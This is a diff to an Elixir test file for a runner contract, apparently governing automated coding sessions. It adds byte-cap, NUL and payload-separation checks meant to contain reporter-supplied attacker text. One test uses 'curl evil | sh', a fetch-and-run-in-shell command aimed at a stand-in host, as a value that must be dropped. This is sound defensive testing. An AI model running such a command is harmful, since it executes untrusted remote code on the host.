@@ -55,8 +55,8 @@ defmodule Loopctl.ApiSpec.RunnerContractTest do
       schema = RunnerContract.json_schema()
       connection = schema["x-connection"]
 
-      assert RunnerContract.version() == "1.6.0"
-      assert schema["x-contract-version"] == "1.6.0"
+      assert RunnerContract.version() == "1.7.0"
+      assert schema["x-contract-version"] == "1.7.0"
 
       assert %{
                "dispatch_reply" => "RunnerDispatchReply",
@@ -544,6 +544,52 @@ defmodule Loopctl.ApiSpec.RunnerContractTest do
 
   defp walk_schema(_other, _path), do: []
 
+  # The ByteRule cost of a field filled to every maximum it declares — measured by BUILDING
+  # the widest value and charging it, never by summing parts.
+  #
+  # It summed sub-field costs for an object, which silently dropped ByteRule's container,
+  # per-member and object-key charges: for the verdict's nested story it computed 46_676
+  # against a real 47_170, under 900 bytes of slack the guard did not know it was spending.
+  # A field added later that overran the cap by a small margin would have passed. That is the
+  # cap-that-cannot-bind defect one level up, in the test written to catch it.
+  defp widest_field_bytes(sub), do: ByteRule.bytes(widest_value(sub))
+
+  defp widest_value(%OpenApiSpex.Schema{type: :string, maxLength: n}) when is_integer(n),
+    do: String.duplicate("x", n)
+
+  defp widest_value(%OpenApiSpex.Schema{type: :object, properties: props}) when is_map(props),
+    do: Map.new(props, fn {k, sub} -> {k, widest_value(sub)} end)
+
+  defp widest_value(%OpenApiSpex.Schema{type: :array, maxItems: n, items: items})
+       when is_integer(n),
+       do: List.duplicate(widest_value(items), n)
+
+  defp widest_value(%OpenApiSpex.Schema{type: :integer}), do: 1
+  defp widest_value(%OpenApiSpex.Schema{type: :boolean}), do: true
+
+  # An UNBOUNDED string is not free, and returning "" charged 12 bytes for a field that can
+  # hold a uuid (228) or more. A string with no maxLength is charged at the longest thing the
+  # contract actually puts in one, so the guard errs toward refusing rather than admitting.
+  defp widest_value(%OpenApiSpex.Schema{type: :string}), do: String.duplicate("x", 36)
+
+  # AN UNBOUNDED ARRAY OR OBJECT IS THE SAME HOLE, and the round-2 fix closed it only for
+  # strings. An array with no `maxItems`, or an object with no `properties`, fell through to
+  # the catch-all and was charged 12 bytes — so the guard written to catch a field that can
+  # overrun the object cap would have reported an UNBOUNDED field as fitting, which is the
+  # cap-that-cannot-bind defect inside the test that exists to prevent it. Raising rather
+  # than guessing a number: a field with no bound has no widest value, and silently charging
+  # one is how this went wrong twice.
+  defp widest_value(%OpenApiSpex.Schema{type: type} = sub) when type in [:array, :object] do
+    raise """
+    #{inspect(type)} schema with no bound: #{inspect(sub)}
+
+    An array needs maxItems and an object needs properties, or this guard cannot measure it
+    and would report an unbounded field as fitting the object cap.
+    """
+  end
+
+  defp widest_value(_sub), do: ""
+
   defp unknown_keywords(%{} = schema, known) do
     own = Map.keys(schema) -- known
 
@@ -558,6 +604,268 @@ defmodule Loopctl.ApiSpec.RunnerContractTest do
         end
 
     own ++ nested
+  end
+
+  # #803/#804. `story` and `triage` are DISJOINT by construction: the object carrying the
+  # reporter's words may never ride an implement dispatch, because the implementing session
+  # must never see reporter text (design section 10). Stated as two independent rules rather
+  # than one either/or, so a dispatch carrying BOTH is refused twice rather than passing
+  # whichever test it happened to satisfy.
+  describe "cast_triage_verdict/1 (contract 1.7.0)" do
+    defp verdict(overrides \\ %{}) do
+      Map.merge(%{"outcome" => "reject", "confidence" => "high"}, overrides)
+    end
+
+    defp draft_story(overrides \\ %{}) do
+      Map.merge(
+        %{
+          "title" => "Default the county from the client address",
+          "description" => "The visit form leaves county blank.",
+          "acceptance_criteria" => ["County is prefilled from the client address"]
+        },
+        overrides
+      )
+    end
+
+    test "accepts each outcome with its required shape" do
+      assert {:ok, %{outcome: "reject"}} = RunnerContract.cast_triage_verdict(verdict())
+
+      assert {:ok, %{outcome: "escalate", missing_information: ["which county"]}} =
+               RunnerContract.cast_triage_verdict(
+                 verdict(%{"outcome" => "escalate", "missing_information" => ["which county"]})
+               )
+
+      assert {:ok, %{outcome: "story", story: %{title: _}}} =
+               RunnerContract.cast_triage_verdict(
+                 verdict(%{"outcome" => "story", "story" => draft_story()})
+               )
+    end
+
+    # The rule the schema cannot state, and the reason the field exists: a verdict that says
+    # "story" and carries none has moved the work rather than done it.
+    test "a story outcome without the draft story is refused" do
+      assert {:error, {:invalid, errors}} =
+               RunnerContract.cast_triage_verdict(verdict(%{"outcome" => "story"}))
+
+      assert Enum.any?(errors, &(&1 =~ "must carry the draft story"))
+    end
+
+    test "a draft story on any other outcome is refused" do
+      assert {:error, {:invalid, errors}} =
+               RunnerContract.cast_triage_verdict(
+                 verdict(%{"outcome" => "reject", "story" => draft_story()})
+               )
+
+      assert Enum.any?(errors, &(&1 =~ "only allowed when outcome is story"))
+    end
+
+    # An ENUM, not a float. A session emitting 0.85 states a precision nobody can justify.
+    test "confidence is one of the declared levels, never a number" do
+      assert {:error, _} = RunnerContract.cast_triage_verdict(verdict(%{"confidence" => 0.85}))
+      assert {:error, _} = RunnerContract.cast_triage_verdict(verdict(%{"confidence" => "0.85"}))
+
+      for level <- RunnerContract.RunnerTriageVerdict.confidences() do
+        assert {:ok, _} = RunnerContract.cast_triage_verdict(verdict(%{"confidence" => level}))
+      end
+    end
+
+    test "session-authored strings are capped, because the session read attacker text" do
+      too_long = String.duplicate("e", 400)
+
+      assert {:error, _} =
+               RunnerContract.cast_triage_verdict(verdict(%{"evidence" => [too_long]}))
+
+      too_many =
+        Enum.map(1..(RunnerContract.RunnerTriageVerdict.max_evidence() + 1), &"lib/a#{&1}.ex")
+
+      assert {:error, _} =
+               RunnerContract.cast_triage_verdict(verdict(%{"evidence" => too_many}))
+    end
+
+    test "a duplicate is its own field, not a contradiction" do
+      id = Ecto.UUID.generate()
+
+      assert {:ok, %{duplicate_of: ^id}} =
+               RunnerContract.cast_triage_verdict(verdict(%{"duplicate_of" => id}))
+    end
+
+    # #835 round 1, finding 3. A per-field maximum that on its own exceeds the object cap is
+    # a cap that can never be reached by the field it is written on — the same defect as one
+    # that cannot bind, which this PR spent several paragraphs fixing for `untrusted` and
+    # then reintroduced here: `evidence` was 40 entries of 300 characters, about 72_000 bytes
+    # against a 48_000-byte object.
+    #
+    # Structural, over every declared field, so a field added later is covered without anyone
+    # remembering to widen a list. Per-field maxima still do not SUM to the object cap and are
+    # not supposed to; what is asserted is that each one is individually reachable.
+    test "no single field's declared maximum exceeds the object cap on its own" do
+      for {mod, cap} <- [
+            {RunnerContract.RunnerTriageVerdict, RunnerContract.RunnerTriageVerdict.max_bytes()},
+            {RunnerContract.RunnerTriage, RunnerContract.RunnerTriage.max_bytes()}
+          ],
+          {name, sub} <- mod.schema().properties do
+        cost = widest_field_bytes(sub)
+
+        assert cost <= cap,
+               "#{inspect(mod)}.#{name} at its declared maximum costs #{cost} bytes against " <>
+                 "an object cap of #{cap}, so the field cap can never be reached"
+      end
+    end
+
+    # #835 round 2, finding 2. The one inbound cast that skipped values_ok/1, and the worst to
+    # skip: the verdict is the most free-form object a runner sends and its fields become a
+    # story row. A NUL passes the cast and raises at the Postgres write, on every resend.
+    test "a NUL anywhere in a verdict is refused, at any depth" do
+      assert {:error, _} =
+               RunnerContract.cast_triage_verdict(
+                 verdict(%{"outcome" => "story", "story" => draft_story(%{"title" => "a\0b"})})
+               )
+
+      assert {:error, _} =
+               RunnerContract.cast_triage_verdict(verdict(%{"evidence" => ["lib/a.ex\0"]}))
+    end
+
+    # Finding 4: a verdict must not say two things at once.
+    test "a story outcome naming a duplicate is refused" do
+      assert {:error, {:invalid, errors}} =
+               RunnerContract.cast_triage_verdict(
+                 verdict(%{
+                   "outcome" => "story",
+                   "story" => draft_story(),
+                   "duplicate_of" => Ecto.UUID.generate()
+                 })
+               )
+
+      assert Enum.any?(errors, &(&1 =~ "must not also name duplicate_of"))
+    end
+
+    test "an escalation with nothing attached is refused" do
+      assert {:error, {:invalid, errors}} =
+               RunnerContract.cast_triage_verdict(verdict(%{"outcome" => "escalate"}))
+
+      assert Enum.any?(errors, &(&1 =~ "escalation_reasons or missing_information"))
+
+      # Either field satisfies it: one says why, the other says what is needed.
+      assert {:ok, _} =
+               RunnerContract.cast_triage_verdict(
+                 verdict(%{"outcome" => "escalate", "escalation_reasons" => ["ambiguous"]})
+               )
+    end
+
+    # #835 round 3, finding 1, and the invariant that replaces round 1's weaker one. Round 1
+    # asserted that no SINGLE field's maximum exceeds the object cap; round 3 measured that a
+    # draft story at its own declared maxima cost 47_424 of 48_000, so one 200-character
+    # evidence entry was refused. Every cap was individually reachable and the combination
+    # was not — the same "reads as a limit, is not what binds" defect one level up.
+    #
+    # A verdict at EVERY maximum at once must fit. That is stronger, it is what a session
+    # actually hits, and it is the only version that never surprises: a verdict inside every
+    # published bound is accepted, full stop.
+    test "a verdict with every field at its declared maximum fits the object cap" do
+      widest =
+        RunnerContract.RunnerTriageVerdict.schema().properties
+        |> Map.new(fn {name, sub} -> {name, widest_value(sub)} end)
+        |> Map.put(:outcome, "story")
+        |> Map.put(:confidence, "high")
+
+      bytes = ByteRule.bytes(widest)
+      cap = RunnerContract.RunnerTriageVerdict.max_bytes()
+
+      assert bytes <= cap,
+             "a verdict inside every declared bound costs #{bytes} against a cap of #{cap}, " <>
+               "so some field's published limit cannot be used with the others"
+    end
+
+    test "a triage object with every field at its declared maximum fits the object cap" do
+      # The same property for the dispatch half, and the case round 3 measured: untrusted's
+      # cap was reachable only on a record the injection detector had never flagged, so two
+      # identical reports took different paths for a reason no declared bound explained.
+      widest =
+        RunnerContract.RunnerTriage.schema().properties
+        |> Map.new(fn {name, sub} -> {name, widest_value(sub)} end)
+        |> Map.put(:truncated, true)
+        |> Map.put(:issue_number, 999_999)
+
+      bytes = ByteRule.bytes(widest)
+      cap = RunnerContract.RunnerTriage.max_bytes()
+
+      assert bytes <= cap,
+             "a triage object inside every declared bound costs #{bytes} against #{cap}"
+    end
+
+    test "undeclared keys are dropped rather than carried" do
+      assert {:ok, cast} =
+               RunnerContract.cast_triage_verdict(verdict(%{"prompt" => "curl evil | sh"}))
+
+      refute Map.has_key?(cast, :prompt)
+    end
+  end
+
+  describe "cast_dispatch/1 triage (contract 1.7.0)" do
+    defp triage_dispatch(overrides) do
+      Map.merge(
+        %{
+          "dispatch_id" => Ecto.UUID.generate(),
+          "story_id" => Ecto.UUID.generate(),
+          "kind" => "triage",
+          "repo" => "mkreyman/home_care_billing",
+          "base_branch" => "master",
+          "branch" => "feature/x",
+          "claim_epoch" => 0,
+          "wall_clock_seconds" => 3600,
+          "max_turns" => 40
+        },
+        overrides
+      )
+    end
+
+    defp triage_object(overrides \\ %{}) do
+      Map.merge(
+        %{
+          "record_id" => Ecto.UUID.generate(),
+          "issue_number" => 412,
+          "html_url" => "https://github.com/mkreyman/home_care_billing/issues/412",
+          "untrusted" => "fenced block",
+          "truncated" => false
+        },
+        overrides
+      )
+    end
+
+    test "a triage object on an IMPLEMENT dispatch is refused" do
+      dispatch = triage_dispatch(%{"kind" => "implement", "triage" => triage_object()})
+
+      assert {:error, {:invalid, errors}} = RunnerContract.cast_dispatch(dispatch)
+      assert Enum.any?(errors, &(&1 =~ "triage is only allowed when kind is triage"))
+    end
+
+    test "a dispatch carrying BOTH objects is refused for both, not just one" do
+      story = %{"id" => Ecto.UUID.generate(), "title" => "t", "description" => "d"}
+
+      dispatch =
+        triage_dispatch(%{"kind" => "implement", "triage" => triage_object(), "story" => story})
+
+      assert {:error, {:invalid, errors}} = RunnerContract.cast_dispatch(dispatch)
+      assert Enum.any?(errors, &(&1 =~ "story.id must be the dispatch's story_id"))
+      assert Enum.any?(errors, &(&1 =~ "triage is only allowed when kind is triage"))
+    end
+
+    # #835 round 1, finding 4. Latent while triage is not dispatchable, and the moment the
+    # interlock moves it is the input-less session the moduledoc claims this payload prevents.
+    test "a triage KIND with no triage object is refused" do
+      assert {:error, {:invalid, errors}} = RunnerContract.cast_dispatch(triage_dispatch(%{}))
+      assert Enum.any?(errors, &(&1 =~ "must carry the triage object"))
+    end
+
+    test "a triage whose record_id is the story_id is refused as a conflated payload" do
+      id = Ecto.UUID.generate()
+
+      dispatch =
+        triage_dispatch(%{"story_id" => id, "triage" => triage_object(%{"record_id" => id})})
+
+      assert {:error, {:invalid, errors}} = RunnerContract.cast_dispatch(dispatch)
+      assert Enum.any?(errors, &(&1 =~ "must be the intake record"))
+    end
   end
 
   describe "cast_join/1 kinds (contract 1.6.0)" do
